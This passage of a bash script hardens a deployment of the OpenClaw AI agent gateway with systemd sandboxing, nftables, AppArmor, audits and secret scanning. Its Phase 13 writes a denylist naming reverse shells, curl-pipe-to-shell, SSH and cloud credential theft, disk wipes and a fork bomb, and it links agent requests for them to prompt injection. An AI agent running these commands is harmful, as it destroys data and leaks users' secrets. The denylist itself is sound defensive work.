# Step 18: Create hardened systemd user service
# -----------------------------------------------------------------------------

msg "Step 18: Creating hardened systemd user service..."

# Create user systemd directory
SYSTEMD_USER_DIR="$OC_HOME/.config/systemd/user"
mkdir -p "$SYSTEMD_USER_DIR"
chown -R "$OC_USER:$OC_USER" "$OC_HOME/.config"

# Detect openclaw binary path
OPENCLAW_BIN=""
if command -v openclaw &>/dev/null; then
    OPENCLAW_BIN=$(which openclaw)
    info "OpenClaw binary found: $OPENCLAW_BIN"
elif [[ -x "/usr/local/bin/openclaw" ]]; then
    OPENCLAW_BIN="/usr/local/bin/openclaw"
    info "OpenClaw binary found: $OPENCLAW_BIN"
elif [[ -x "$OC_HOME/.local/bin/openclaw" ]]; then
    OPENCLAW_BIN="$OC_HOME/.local/bin/openclaw"
    info "OpenClaw binary found: $OPENCLAW_BIN"
else
    OPENCLAW_BIN="/usr/local/bin/openclaw"
    warn "OpenClaw binary not found at standard paths"
    warn "Defaulting to: $OPENCLAW_BIN"
    warn "Update ExecStart in the service file if installed elsewhere"
fi

cat > "$SYSTEMD_USER_DIR/openclaw-gateway.service" <<EOF
# =============================================================================
# Hardened systemd user service for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# This service runs as user '$OC_USER' (not root).
# Manage with: systemctl --user start|stop|restart openclaw-gateway
# View logs:   journalctl --user -u openclaw-gateway -f
# =============================================================================

[Unit]
Description=OpenClaw AI Agent Gateway (Hardened)
Documentation=https://openclaw.dev/docs/gateway
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=300
StartLimitBurst=5

[Service]
Type=simple
ExecStart=$OPENCLAW_BIN gateway
WorkingDirectory=$OC_WORKSPACE
EnvironmentFile=$OC_ENV_FILE

# --- Restart policy ---
Restart=on-failure
RestartSec=10
TimeoutStartSec=30
TimeoutStopSec=30
WatchdogSec=60

# --- Resource limits ---
LimitNOFILE=4096
LimitNPROC=512

# --- Logging ---
StandardOutput=journal
StandardError=journal
SyslogIdentifier=openclaw-gateway

[Install]
WantedBy=default.target
EOF

chown "$OC_USER:$OC_USER" "$SYSTEMD_USER_DIR/openclaw-gateway.service"
chmod 644 "$SYSTEMD_USER_DIR/openclaw-gateway.service"
msg "systemd user service created: $SYSTEMD_USER_DIR/openclaw-gateway.service"

# -----------------------------------------------------------------------------
# Step 19: Create systemd hardening drop-in
# -----------------------------------------------------------------------------

msg "Step 19: Creating systemd hardening drop-in..."

DROPIN_DIR="$SYSTEMD_USER_DIR/openclaw-gateway.service.d"
mkdir -p "$DROPIN_DIR"

# Determine RestrictNamespaces based on sandbox
if [[ "$WITH_SANDBOX" == true ]]; then
    NAMESPACE_RESTRICTION="RestrictNamespaces=~cgroup ipc"
    NAMESPACE_COMMENT="# Allow user/net/pid/mnt namespaces for Docker sandbox, restrict cgroup and ipc"
else
    NAMESPACE_RESTRICTION="RestrictNamespaces=yes"
    NAMESPACE_COMMENT="# All namespace creation restricted (no sandbox mode)"
fi

cat > "$DROPIN_DIR/hardening.conf" <<EOF
# =============================================================================
# systemd hardening drop-in for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# These directives apply defense-in-depth sandboxing to the OpenClaw process.
# Note: MemoryDenyWriteExecute=no is required because Node.js V8 JIT
# needs writable+executable memory pages for just-in-time compilation.
# =============================================================================

[Service]
# --- Filesystem sandboxing ---
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=$OC_DIR
PrivateTmp=yes
PrivateDevices=yes
UMask=077

# --- Kernel protection ---
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectKernelLogs=yes
ProtectControlGroups=yes

# --- Privilege restrictions ---
NoNewPrivileges=yes
LockPersonality=yes
RestrictSUIDSGID=yes
CapabilityBoundingSet=

# --- Memory ---
# Node.js V8 JIT requires write+execute memory; cannot use MemoryDenyWriteExecute
MemoryDenyWriteExecute=no

# --- Network restrictions ---
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX AF_NETLINK
IPAddressAllow=localhost
IPAddressDeny=any

# --- Namespace restrictions ---
$NAMESPACE_COMMENT
$NAMESPACE_RESTRICTION
RestrictRealtime=yes

# --- System call filtering ---
SystemCallFilter=@system-service @network-io
SystemCallFilter=~@mount @reboot @swap @clock @cpu-emulation @debug @obsolete @raw-io @privileged
SystemCallArchitectures=native

# --- Protect proc/sys ---
ProtectProc=invisible
ProcSubset=pid
ProtectHostname=yes
EOF

chown -R "$OC_USER:$OC_USER" "$DROPIN_DIR"
chmod 644 "$DROPIN_DIR/hardening.conf"
msg "Hardening drop-in created: $DROPIN_DIR/hardening.conf"

# Reload systemd for the user
# We need loginctl enable-linger for user services to persist
if command -v loginctl &>/dev/null; then
    loginctl enable-linger "$OC_USER" 2>/dev/null || \
        warn "Failed to enable linger for $OC_USER (user services may not persist after logout)"
fi

# Reload user daemon
if su - "$OC_USER" -c "XDG_RUNTIME_DIR=/run/user/$(id -u "$OC_USER") systemctl --user daemon-reload" 2>/dev/null; then
    msg "systemd user daemon reloaded for $OC_USER"
else
    warn "Could not reload user daemon (user session may not be active)"
    warn "Run manually: systemctl --user daemon-reload"
fi

echo

# =============================================================================
# PHASE 10: FIREWALL RULES (--with-firewall)
# =============================================================================

echo -e "${C_BLUE}--- Phase 10: Firewall Rules ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 20: nftables rules
# -----------------------------------------------------------------------------

if [[ "$WITH_FIREWALL" == true ]]; then
    msg "Step 20: Creating nftables firewall rules..."

    # Verify nftables is available
    if ! command -v nft &>/dev/null; then
        warn "nftables (nft) is not installed. Install: pacman -S nftables"
        warn "Firewall rules will be written but cannot be loaded"
    fi

    # Create nftables include directory if it doesn't exist
    mkdir -p /etc/nftables.d

    cat > "/etc/nftables.d/openclaw.conf" <<EOF
# =============================================================================
# nftables rules for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Purpose:
#   - Block ALL inbound connections to the gateway port except loopback
#   - Allow outbound HTTPS for AI API calls (Anthropic, OpenAI)
#   - Allow outbound to messaging platform ports
#   - Rate limit WebSocket connections
#
# Load: nft -f /etc/nftables.d/openclaw.conf
# Or include in /etc/nftables.conf: include "/etc/nftables.d/openclaw.conf"
# =============================================================================

table inet openclaw {
    # Rate limiting set: max 10 new connections per source IP per minute
    set ratelimit_v4 {
        type ipv4_addr
        size 65535
        flags dynamic,timeout
        timeout 1m
    }

    set ratelimit_v6 {
        type ipv6_addr
        size 65535
        flags dynamic,timeout
        timeout 1m
    }

    # Allowed outbound destination ports
    # 443 = HTTPS (API calls to Anthropic/OpenAI/messaging webhooks)
    # 5222 = XMPP (some messaging platforms)
    # 5223 = XMPP over TLS
    # 8443 = Telegram Bot API alternative port
    set allowed_outbound_ports {
        type inet_service
        elements = { 443, 5222, 5223, 8443 }
    }

    chain input {
        type filter hook input priority 0; policy accept;

        # Allow loopback traffic to gateway port
        iif lo tcp dport $OC_PORT accept

        # Rate limit: max 10 new connections per minute per source IP
        ip saddr != 127.0.0.0/8 tcp dport $OC_PORT ct state new \\
            add @ratelimit_v4 { ip saddr limit rate 10/minute burst 5 packets } accept
        ip6 saddr != ::1 tcp dport $OC_PORT ct state new \\
            add @ratelimit_v6 { ip6 saddr limit rate 10/minute burst 5 packets } accept

        # Drop all non-loopback traffic to gateway port
        tcp dport $OC_PORT drop

        # Log dropped gateway connection attempts
        tcp dport $OC_PORT log prefix "openclaw-blocked: " level warn drop
    }

    chain output {
        type filter hook output priority 0; policy accept;

        # Allow outbound to approved ports (API calls, messaging)
        tcp dport @allowed_outbound_ports accept

        # Allow DNS for hostname resolution
        udp dport 53 accept
        tcp dport 53 accept

        # Allow loopback
        oif lo accept

        # Allow established/related connections
        ct state established,related accept
    }
}
EOF

    chmod 644 "/etc/nftables.d/openclaw.conf"
    msg "nftables rules written: /etc/nftables.d/openclaw.conf"

    # Try to load the rules
    if command -v nft &>/dev/null; then
        if nft -c -f "/etc/nftables.d/openclaw.conf" 2>/dev/null; then
            msg "nftables rules validated successfully"
            info "To load: nft -f /etc/nftables.d/openclaw.conf"
            info "To persist: add 'include \"/etc/nftables.d/openclaw.conf\"' to /etc/nftables.conf"
        else
            warn "nftables rules have syntax issues — review /etc/nftables.d/openclaw.conf"
        fi
    fi

    info "Firewall policy:"
    info "  - BLOCK all inbound to port $OC_PORT except loopback (127.0.0.1/::1)"
    info "  - Rate limit: max 10 new connections/minute per source IP"
    info "  - ALLOW outbound: 443 (HTTPS/APIs), 53 (DNS), 5222-5223 (XMPP), 8443 (Telegram)"
else
    info "Step 20: Firewall not requested (use --with-firewall to enable)"
    warn "Without firewall rules, the gateway port is accessible from the network"
    warn "The gateway.bind='loopback' setting is your primary defense"
fi

echo

# =============================================================================
# PHASE 11: APPARMOR PROFILE (--with-apparmor)
# =============================================================================

echo -e "${C_BLUE}--- Phase 11: AppArmor Profile ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 21: AppArmor profile
# -----------------------------------------------------------------------------

if [[ "$WITH_APPARMOR" == true ]]; then
    msg "Step 21: Creating AppArmor confinement profile..."

    APPARMOR_DIR="/etc/apparmor.d"

    if [[ -d "$APPARMOR_DIR" ]]; then
        # Resolve node binary path
        NODE_BIN=$(which node 2>/dev/null || echo "/usr/bin/node")
        NODE_BIN_REAL=$(realpath "$NODE_BIN" 2>/dev/null || echo "$NODE_BIN")

        cat > "$APPARMOR_DIR/openclaw-gateway" <<EOF
# =============================================================================
# AppArmor profile for OpenClaw Gateway
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# This profile confines the OpenClaw Node.js process to:
#   - Read access to Node.js binary and system libraries
#   - Read/write access to ~/.openclaw/ only
#   - Network access for WebSocket (gateway) and HTTPS (API calls)
#   - Deny mount, ptrace, raw network, and sensitive paths
# =============================================================================

abi <abi/3.0>,

#include <tunables/global>

profile openclaw-gateway $NODE_BIN_REAL flags=(enforce) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/openssl>

  # ---- Network ----
  # Allow TCP/UDP for WebSocket gateway and outbound API calls
  network inet stream,
  network inet dgram,
  network inet6 stream,
  network inet6 dgram,
  network unix stream,

  # Deny raw sockets (no packet sniffing, no ICMP crafting)
  deny network raw,
  deny network packet,

  # ---- Node.js binary and libraries ----
  $NODE_BIN_REAL                              mr,
  $NODE_BIN                                   mr,
  /usr/lib/**                                 mr,
  /usr/lib/node_modules/**                    mr,
  /usr/local/lib/node_modules/**              mr,
  /usr/share/nodejs/**                        r,

  # ---- OpenClaw installation (pnpm global or local) ----
  $OC_HOME/.local/share/pnpm/**              mr,
  $OC_HOME/.local/bin/openclaw               mr,
  /usr/local/bin/openclaw                     mr,

  # ---- OpenClaw data directory ----
  owner $OC_DIR/                              r,
  owner $OC_DIR/**                            rw,
  owner $OC_CONFIG                            rw,
  owner $OC_ENV_FILE                          r,
  owner $OC_WORKSPACE/**                      rw,
  owner $OC_CREDENTIALS/**                    r,
  owner $OC_LOG_DIR/**                        rw,
  owner $OC_DIR/agents/**                     rw,

  # ---- TLS trust store (for HTTPS API calls) ----
  /etc/ssl/certs/**                           r,
  /etc/ca-certificates/**                     r,
  /usr/share/ca-certificates/**               r,
  /etc/ssl/openssl.cnf                        r,

  # ---- Proc (Node.js needs some /proc access) ----
  owner /proc/*/fd/                           r,
  owner /proc/*/status                        r,
  owner /proc/*/stat                          r,
  owner /proc/*/maps                          r,
  /proc/sys/kernel/random/boot_id             r,
  /proc/sys/kernel/random/uuid                r,
  /proc/sys/vm/overcommit_memory              r,
  /proc/cpuinfo                               r,
  /proc/meminfo                               r,
  /proc/version                               r,

  # ---- Temporary files ----
  owner /tmp/**                               rw,
  owner /var/tmp/**                            rw,

  # ---- Deny dangerous operations ----
  deny mount,
  deny umount,
  deny ptrace,
  deny pivot_root,

  # ---- Deny access to sensitive system paths ----
  deny /proc/*/mem                            rwklx,
  deny /proc/kcore                            rwklx,
  deny /proc/kmem                             rwklx,
  deny /sys/**                                w,
  deny /boot/**                               rwklx,
  deny /dev/mem                               rwklx,
  deny /dev/kmem                              rwklx,
  deny /dev/port                              rwklx,

  # ---- Deny access to other users' home directories ----
  deny /home/*/                               rwklx,
  deny /root/**                               rwklx,
  # Re-allow our own user's home
  owner $OC_HOME/**                           r,
  owner $OC_DIR/**                            rw,

  # ---- Deny access to SSH keys and auth material ----
  deny $OC_HOME/.ssh/**                       rwklx,
  deny $OC_HOME/.gnupg/**                     rwklx,
  deny $OC_HOME/.aws/**                       rwklx,
  deny $OC_HOME/.kube/**                      rwklx,
  deny /etc/shadow                            rwklx,
  deny /etc/gshadow                           rwklx,
  deny /etc/sudoers                           rwklx,
  deny /etc/sudoers.d/**                      rwklx,

  # ---- Deny execution from writable paths ----
  deny /tmp/**                                x,
  deny /var/tmp/**                             x,
  deny $OC_WORKSPACE/**                       x,
}
EOF

        chmod 644 "$APPARMOR_DIR/openclaw-gateway"
        msg "AppArmor profile created: $APPARMOR_DIR/openclaw-gateway"

        # Load the profile if AppArmor is active
        if command -v apparmor_parser &>/dev/null; then
            if apparmor_parser -r -W "$APPARMOR_DIR/openclaw-gateway" 2>/dev/null; then
                if aa-enforce "$APPARMOR_DIR/openclaw-gateway" 2>/dev/null; then
                    msg "AppArmor profile loaded in ENFORCE mode"
                else
                    warn "AppArmor profile loaded but could not set enforce mode"
                    warn "Check: aa-status | grep openclaw"
                fi
            else
                warn "Failed to parse AppArmor profile (AppArmor may not be active)"
                warn "Ensure AppArmor is installed and enabled: systemctl enable --now apparmor"
            fi
        else
            warn "apparmor_parser not found — profile written but not loaded"
            warn "Install AppArmor: pacman -S apparmor"
            warn "Then load: apparmor_parser -r /etc/apparmor.d/openclaw-gateway"
        fi

        info "AppArmor policy summary:"
        info "  ALLOW: Node.js binary, system libs, TLS certs"
        info "  ALLOW: Read/write to $OC_DIR/ only"
        info "  ALLOW: Network inet/inet6 stream (WebSocket + HTTPS)"
        info "  DENY:  mount, ptrace, raw network"
        info "  DENY:  /proc/*/mem, /sys/**, /boot/**, /dev/mem"
        info "  DENY:  Other users' home directories, /root/"
        info "  DENY:  SSH keys, GPG keys, AWS/Kube configs"
        info "  DENY:  Execution from /tmp, /var/tmp, workspace"
    else
        warn "AppArmor directory $APPARMOR_DIR does not exist"
        warn "Install AppArmor first: pacman -S apparmor"
        warn "Then run the apparmor hardening script"
    fi
else
    info "Step 21: AppArmor not requested (use --with-apparmor to enable)"
fi

echo

# =============================================================================
# PHASE 12: SECURITY AUDIT & WORKSPACE PROTECTION
# =============================================================================

echo -e "${C_BLUE}--- Phase 12: Security Audit & Workspace Protection ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 22: Initialize workspace as git repo
# -----------------------------------------------------------------------------

msg "Step 22: Initializing workspace as git repo for rollback..."

if [[ -d "$OC_WORKSPACE/.git" ]]; then
    info "Workspace is already a git repository"
else
    su - "$OC_USER" -c "cd '$OC_WORKSPACE' && git init --quiet" 2>/dev/null || {
        # Fallback if su fails (user session not active)
        cd "$OC_WORKSPACE"
        git init --quiet
        chown -R "$OC_USER:$OC_USER" "$OC_WORKSPACE/.git"
    }
    msg "Initialized git repo in $OC_WORKSPACE"
fi

# Create a .gitignore for the workspace
cat > "$OC_WORKSPACE/.gitignore" <<'EOF'
# OpenClaw workspace .gitignore
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

# Secrets and credentials
.env
.env.*
*.key
*.pem
*.p12
*.pfx
credentials/
secrets/

# Node modules
node_modules/

# IDE and OS
.vscode/
.idea/
.DS_Store
Thumbs.db

# Logs
*.log
logs/

# Build artifacts
dist/
build/
*.tgz
EOF

chown "$OC_USER:$OC_USER" "$OC_WORKSPACE/.gitignore"
info "Created $OC_WORKSPACE/.gitignore"

# Initial commit
su - "$OC_USER" -c "
    cd '$OC_WORKSPACE' && \
    git config user.email 'openclaw@localhost' 2>/dev/null && \
    git config user.name 'OpenClaw Hardening' 2>/dev/null && \
    git add -A 2>/dev/null && \
    git commit -m 'Initial workspace snapshot (post-hardening)' --allow-empty --quiet 2>/dev/null
" 2>/dev/null || {
    info "Could not create initial git commit (non-fatal)"
}
msg "Workspace git repo initialized for rollback capability"
info "Use 'git log' in $OC_WORKSPACE to track workspace changes"

# -----------------------------------------------------------------------------
# Step 23: Run openclaw security audit
# -----------------------------------------------------------------------------

msg "Step 23: Running OpenClaw security audit..."

if command -v openclaw &>/dev/null; then
    info "OpenClaw CLI found. Running security audit..."

    # Run as the target user
    AUDIT_OUTPUT=$(su - "$OC_USER" -c "openclaw security audit --deep --filesystem 2>&1" 2>/dev/null) || true

    if [[ -n "$AUDIT_OUTPUT" ]]; then
        echo "$AUDIT_OUTPUT"
        msg "Security audit completed"

        # Save audit results
        AUDIT_FILE="$OC_DIR/security-audit-$(date +%Y%m%d-%H%M%S).log"
        echo "$AUDIT_OUTPUT" > "$AUDIT_FILE"
        chown "$OC_USER:$OC_USER" "$AUDIT_FILE"
        chmod 600 "$AUDIT_FILE"
        info "Audit results saved to: $AUDIT_FILE"
    else
        warn "Security audit produced no output"
    fi
else
    warn "OpenClaw CLI not found in PATH"
    warn "Install OpenClaw and run manually: openclaw security audit --deep --filesystem"
    warn "Or run: openclaw doctor"
fi

# -----------------------------------------------------------------------------
# Step 24: Create security audit systemd timer
# -----------------------------------------------------------------------------

msg "Step 24: Creating weekly security audit systemd timer..."

# Audit script
AUDIT_SCRIPT="$OC_HOME/.local/bin/openclaw-security-audit.sh"
mkdir -p "$OC_HOME/.local/bin"
chown "$OC_USER:$OC_USER" "$OC_HOME/.local" "$OC_HOME/.local/bin"

cat > "$AUDIT_SCRIPT" <<'AUDIT_SCRIPT_EOF'
#!/usr/bin/env bash
# =============================================================================
# Automated OpenClaw security audit
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Runs weekly via systemd timer: openclaw-audit.timer
# Results are logged and old logs are rotated.
# =============================================================================

set -euo pipefail

AUDIT_SCRIPT_EOF

cat >> "$AUDIT_SCRIPT" <<EOF
OC_DIR="$OC_DIR"
AUDIT_LOG_DIR="$OC_DIR/audit-logs"
AUDIT_LOG="\$AUDIT_LOG_DIR/security-audit-\$(date +%Y%m%d-%H%M%S).log"

mkdir -p "\$AUDIT_LOG_DIR"

echo "=== OpenClaw Security Audit: \$(date) ===" >> "\$AUDIT_LOG"
echo "" >> "\$AUDIT_LOG"

if command -v openclaw &>/dev/null; then
    openclaw security audit --deep >> "\$AUDIT_LOG" 2>&1 || true
    echo "" >> "\$AUDIT_LOG"
    openclaw doctor >> "\$AUDIT_LOG" 2>&1 || true
else
    echo "ERROR: openclaw CLI not found in PATH" >> "\$AUDIT_LOG"
fi

echo "" >> "\$AUDIT_LOG"
echo "=== Audit complete ===" >> "\$AUDIT_LOG"

# Rotate: keep last 12 audit logs (12 weeks = ~3 months)
ls -1t "\$AUDIT_LOG_DIR"/security-audit-*.log 2>/dev/null | tail -n +13 | xargs -r rm -f
EOF

chmod 755 "$AUDIT_SCRIPT"
chown "$OC_USER:$OC_USER" "$AUDIT_SCRIPT"

# Audit service (user-level)
cat > "$SYSTEMD_USER_DIR/openclaw-audit.service" <<EOF
# Weekly OpenClaw security audit service
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

[Unit]
Description=OpenClaw Weekly Security Audit
After=network-online.target

[Service]
Type=oneshot
ExecStart=$AUDIT_SCRIPT
PrivateTmp=true
EOF

# Audit timer (user-level)
cat > "$SYSTEMD_USER_DIR/openclaw-audit.timer" <<EOF
# Weekly OpenClaw security audit timer
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

[Unit]
Description=Weekly OpenClaw Security Audit Timer

[Timer]
OnCalendar=weekly
RandomizedDelaySec=3600
Persistent=true

[Install]
WantedBy=timers.target
EOF

chown "$OC_USER:$OC_USER" \
    "$SYSTEMD_USER_DIR/openclaw-audit.service" \
    "$SYSTEMD_USER_DIR/openclaw-audit.timer"
chmod 644 \
    "$SYSTEMD_USER_DIR/openclaw-audit.service" \
    "$SYSTEMD_USER_DIR/openclaw-audit.timer"

# Enable the timer
su - "$OC_USER" -c "
    XDG_RUNTIME_DIR=/run/user/$(id -u "$OC_USER") \
    systemctl --user daemon-reload 2>/dev/null && \
    systemctl --user enable openclaw-audit.timer 2>/dev/null && \
    systemctl --user start openclaw-audit.timer 2>/dev/null
" 2>/dev/null || {
    warn "Could not enable audit timer (user session may not be active)"
    warn "Run manually: systemctl --user enable --now openclaw-audit.timer"
}

msg "Weekly security audit timer created"
info "Service: $SYSTEMD_USER_DIR/openclaw-audit.service"
info "Timer:   $SYSTEMD_USER_DIR/openclaw-audit.timer"
info "Script:  $AUDIT_SCRIPT"

echo

# =============================================================================
# PHASE 13: DANGEROUS COMMAND DENYLIST
# =============================================================================

echo -e "${C_BLUE}--- Phase 13: Dangerous Command Denylist ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 25: Create exec denylist documentation
# -----------------------------------------------------------------------------

msg "Step 25: Documenting dangerous commands that must NEVER be allowlisted..."

DENYLIST_FILE="$OC_DIR/EXEC_DENYLIST.md"

cat > "$DENYLIST_FILE" <<'DENYLIST_EOF'
# OpenClaw Exec Denylist — Commands That Must NEVER Be Allowlisted

> Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
> Last updated: TIMESTAMP_PLACEHOLDER
>
> These commands represent the highest-risk operations that an AI agent
> should NEVER be permitted to execute, even in elevated mode.
> If the AI requests any of these, it may be the result of prompt injection.

## Destructive Commands (Data Loss / System Damage)

| Command | Risk |
|---------|------|
| `rm -rf /` | Recursive delete of entire filesystem |
| `rm -rf ~` | Recursive delete of user home directory |
| `rm -rf *` | Recursive delete of current directory contents |
| `mkfs.*` | Format filesystem (irreversible data loss) |
| `dd if=/dev/zero of=/dev/sd*` | Overwrite disk with zeros |
| `dd if=/dev/urandom of=/dev/sd*` | Overwrite disk with random data |
| `:(){ :|:& };:` | Fork bomb (system resource exhaustion) |
| `> /dev/sda` | Overwrite boot sector |
| `shred /dev/sd*` | Cryptographic disk wiping |
| `wipefs -a /dev/sd*` | Erase filesystem signatures |
| `chmod -R 000 /` | Remove all permissions recursively |
| `chown -R nobody:nobody /` | Transfer ownership to nobody recursively |

## Data Exfiltration Commands

| Command | Risk |
|---------|------|
| `curl <url> \| sh` | Download and execute arbitrary code |
| `curl <url> \| bash` | Download and execute arbitrary code |
| `wget <url> -O- \| sh` | Download and execute arbitrary code |
| `scp ~/.ssh/* remote:` | Exfiltrate SSH keys |
| `tar czf - /home \| curl -X POST -d @- <url>` | Archive and exfiltrate home directory |
| `nc -e /bin/bash <ip> <port>` | Reverse shell |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Reverse shell via bash |
| `python -c 'import socket...'` | Python reverse shell |
| `cat /etc/passwd \| curl -d @- <url>` | Exfiltrate system users |
| `rsync -a / remote:/stolen/` | Mirror entire filesystem to remote |

## Credential Exposure Commands

| Command | Risk |
|---------|------|
| `cat ~/.ssh/id_*` | Display SSH private keys |
| `cat ~/.ssh/authorized_keys` | Display authorized SSH keys |
| `cat ~/.gnupg/private-keys*` | Display GPG private keys |
| `cat ~/.aws/credentials` | Display AWS access keys |
| `cat ~/.kube/config` | Display Kubernetes credentials |
| `cat /etc/shadow` | Display password hashes |
| `printenv` | Display all environment variables (API keys) |
| `env` | Display all environment variables |
| `history` | Display command history (may contain secrets) |
| `cat ~/.bash_history` | Display bash command history |
| `cat ~/.openclaw/.env` | Display OpenClaw API keys |
| `cat ~/.openclaw/credentials/*` | Display stored credentials |

## Git Footguns (Irreversible Repository Damage)

| Command | Risk |
|---------|------|
| `git push --force` | Overwrite remote history (data loss for team) |
| `git push --force-with-lease origin main` | Force push to main branch |
| `git reset --hard` | Discard all uncommitted changes |
| `git clean -fdx` | Delete all untracked files and directories |
| `git checkout .` | Discard all working tree changes |
| `git rebase -i` (on shared branches) | Rewrite shared history |
| `git filter-branch` | Rewrite entire repository history |

## System Modification Commands

| Command | Risk |
|---------|------|
| `systemctl stop *` | Stop arbitrary system services |
| `systemctl disable *` | Disable arbitrary system services |
| `iptables -F` | Flush all firewall rules |
| `nft flush ruleset` | Flush all nftables rules |
| `passwd` | Change user passwords |
| `useradd` / `userdel` | Create or delete system users |
| `visudo` | Modify sudoers file |
| `crontab -e` | Modify scheduled tasks |
| `at` | Schedule one-time tasks |

## Package Manager Commands (Supply Chain Risk)

| Command | Risk |
|---------|------|
| `npm install <arbitrary-package>` | Install potentially malicious package |
| `pip install <arbitrary-package>` | Install potentially malicious package |
| `pacman -S <arbitrary-package>` | Install system package |
| `curl <url> \| npm install` | Install package from untrusted source |
| `pnpm add <arbitrary-package>` | Install potentially malicious package |

## Incident Response

If the AI agent requests any of these commands:

1. **DENY the request immediately**
2. **Check for prompt injection**: Review the conversation for suspicious user messages
3. **Review session logs**: `~/.openclaw/agents/*/sessions/`
4. **Revoke the pairing**: Remove the contact's pairing in OpenClaw settings
5. **Rotate credentials**: Change API keys in `~/.openclaw/.env`
6. **Run security audit**: `openclaw security audit --deep --filesystem`
DENYLIST_EOF

# Replace timestamp placeholder
sed -i "s/TIMESTAMP_PLACEHOLDER/$(date -u +%Y-%m-%dT%H:%M:%SZ)/" "$DENYLIST_FILE"

chown "$OC_USER:$OC_USER" "$DENYLIST_FILE"
chmod 644 "$DENYLIST_FILE"
msg "Exec denylist documentation written: $DENYLIST_FILE"

# Print a summary to stdout
echo
warn "The following command categories must NEVER be allowlisted in OpenClaw:"
warn "  - Destructive:   rm -rf, mkfs.*, dd if=/dev/zero, fork bombs"
warn "  - Exfiltration:  curl|sh, wget|bash, scp ~/.ssh/*, reverse shells"
warn "  - Credentials:   cat ~/.ssh/id_*, printenv, history, cat ~/.aws/*"
warn "  - Git footguns:  git push --force, git reset --hard, git clean -fdx"
warn "  - System:        systemctl stop, iptables -F, passwd, useradd"
warn "  - Packages:      npm install <arbitrary>, pip install <arbitrary>"
warn "  Full list: $DENYLIST_FILE"

echo

# =============================================================================
# PHASE 14: SECRET SCANNING
# =============================================================================

echo -e "${C_BLUE}--- Phase 14: Secret Scanning ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 26: Install and configure detect-secrets
# -----------------------------------------------------------------------------

msg "Step 26: Configuring secret scanning with detect-secrets..."

# Check if pip/python is available
PYTHON_BIN=""
if command -v python3 &>/dev/null; then
    PYTHON_BIN="python3"
elif command -v python &>/dev/null; then
    PYTHON_BIN="python"
fi

if [[ -n "$PYTHON_BIN" ]]; then
    # Check if detect-secrets is already installed
    if command -v detect-secrets &>/dev/null; then
        DS_VER=$(detect-secrets --version 2>/dev/null || echo "unknown")
        info "detect-secrets already installed: $DS_VER"
    else
        info "Installing detect-secrets..."
        if pip install detect-secrets 2>/dev/null || pip3 install detect-secrets 2>/dev/null; then
            msg "detect-secrets installed successfully"
        else
            warn "Failed to install detect-secrets via pip"
            warn "Try: pip install --user detect-secrets"
        fi
    fi

    # Create baseline in workspace
    if command -v detect-secrets &>/dev/null; then
        info "Creating secrets baseline in workspace..."

        su - "$OC_USER" -c "
            cd '$OC_WORKSPACE' && \
            detect-secrets scan --all-files > .secrets.baseline 2>/dev/null
        " 2>/dev/null || {
            # Fallback
            cd "$OC_WORKSPACE"
            detect-secrets scan --all-files > "$OC_WORKSPACE/.secrets.baseline" 2>/dev/null || true
            chown "$OC_USER:$OC_USER" "$OC_WORKSPACE/.secrets.baseline" 2>/dev/null || true
        }

        if [[ -f "$OC_WORKSPACE/.secrets.baseline" ]]; then
            chown "$OC_USER:$OC_USER" "$OC_WORKSPACE/.secrets.baseline"
            chmod 644 "$OC_WORKSPACE/.secrets.baseline"
            msg "Secrets baseline created: $OC_WORKSPACE/.secrets.baseline"
            info "Run periodic scans: detect-secrets scan --baseline .secrets.baseline"
            info "Audit findings: detect-secrets audit .secrets.baseline"
        else
            warn "Could not create secrets baseline (non-fatal)"
        fi
    fi

    # Create a pre-commit hook for the workspace git repo
    HOOKS_DIR="$OC_WORKSPACE/.git/hooks"
    if [[ -d "$HOOKS_DIR" ]] && command -v detect-secrets &>/dev/null; then
        cat > "$HOOKS_DIR/pre-commit" <<'PRECOMMIT_EOF'
#!/usr/bin/env bash
# Pre-commit hook: detect-secrets scan
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

if command -v detect-secrets &>/dev/null; then
    # Scan staged files for secrets
    git diff --staged --name-only -z | xargs -0 detect-secrets scan --baseline .secrets.baseline 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo "[!] Potential secrets detected in staged files!"
        echo "    Run: detect-secrets audit .secrets.baseline"
        exit 1
    fi
fi
PRECOMMIT_EOF
        chmod 755 "$HOOKS_DIR/pre-commit"
        chown "$OC_USER:$OC_USER" "$HOOKS_DIR/pre-commit"
        msg "Pre-commit hook installed for secret scanning"
    fi
else
    warn "Python not found. Cannot install detect-secrets."
    warn "Install Python: pacman -S python python-pip"
    warn "Then install: pip install detect-secrets"
fi

echo

# =============================================================================
# PHASE 15: SUMMARY
# =============================================================================

echo -e "${C_BLUE}--- Phase 15: Security Summary ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 27: Print comprehensive security summary
# -----------------------------------------------------------------------------

echo
echo -e "${C_GREEN}========================================================================${C_NC}"
echo -e "${C_GREEN}    OpenClaw Security Hardening Complete!${C_NC}"
echo -e "${C_GREEN}========================================================================${C_NC}"
echo

echo -e "${C_BLUE}Configuration:${C_NC}"
echo "  User:                $OC_USER"
echo "  OpenClaw home:       $OC_DIR"
echo "  Config file:         $OC_CONFIG"
echo "  Environment file:    $OC_ENV_FILE"
echo "  Workspace:           $OC_WORKSPACE"
echo "  Gateway port:        $OC_PORT"
